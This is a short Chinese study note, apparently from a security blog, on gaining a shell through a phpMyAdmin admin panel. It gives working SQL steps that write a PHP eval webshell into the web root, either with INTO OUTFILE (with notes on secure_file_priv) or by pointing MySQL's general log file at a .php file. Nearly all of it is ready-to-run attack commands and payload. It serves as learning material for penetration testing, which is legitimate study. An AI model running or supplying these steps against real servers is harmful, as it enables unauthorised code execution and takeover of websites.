---
title: phpMyAdmin后台getshell学习笔记
tags:
  - PhpMyAdmin
abbrlink: 15322
date: 2022-05-11 19:56:35
---

# PhpMyAdmin后台getshell学习笔记

## 1.into outfile导入木马

- 首先需要确认网站的绝对路径

  ~~~~sql
  select @@basedir;
  ~~~~

- ~~~~sql
  select '<?php eval($_POST[cmd]);?>' into outfile 'web路径';
  ~~~~

  **mysql**高版本中secure_file_pirv会对读写进行限制

  ~~~sql
  show global variables like '%secure%';
  ~~~

  当`secure_file_priv`为NULL时，表示限制Mysql不允许导入导出。

  要想成功，则需要在Mysql文件夹下修改`my.ini` 文件，在[mysqld]内加入`secure_file_priv =""` 即可。

## 2.利用Mysql日志文件

mysql5.0以上会创建日志文件

1. **general_log** 指的是日志保存状态，ON代表开启 OFF代表关闭；

2. **general_log_file** 指的是日志的保存路径。

   查看日志状态：

   ~~~~sql
   show variables like '%general%';
   ~~~~

   当开启general时，**所执行的sql语句都会出现在`log`文件**。

   修改`general_log_file`的值，执行的sql语句就会对应生成，进而getshell。

   需要注意**路径斜杠的方向**

   ~~~~sql
   set global general_log = 'on'
   set global general_log_file = 'C:/phpStudy/www/hack.php'
   ~~~~

   再次执行，getshell

   ~~~
   select '<?php eval($_POST[cmd]);?>'
   ~~~
